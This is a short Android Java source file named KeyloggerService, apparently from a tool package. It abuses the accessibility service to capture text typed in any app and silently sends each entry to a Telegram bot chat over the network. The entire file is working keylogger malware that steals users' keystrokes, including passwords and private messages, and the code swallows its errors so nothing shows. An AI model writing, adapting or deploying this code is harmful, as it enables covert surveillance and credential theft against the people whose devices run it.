package com.hakodzhak.tools;
import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
public class KeyloggerService extends AccessibilityService {
    String botToken, chatId;
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        botToken = getSharedPreferences("config", MODE_PRIVATE).getString("botToken", "");
        chatId = getSharedPreferences("config", MODE_PRIVATE).getString("chatId", "");
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getText() != null) {
                String text = source.getText().toString();
                if (text.length() > 3) {
                    sendMsg("⌨️ كتب: " + text);
                }
            }
        }
    }
    private void sendMsg(String text) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(text, "UTF-8");
                HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();
                con.getInputStream();
            } catch (Exception e) {}
        }).start();
    }
    @Override
    public void onInterrupt() {}
}
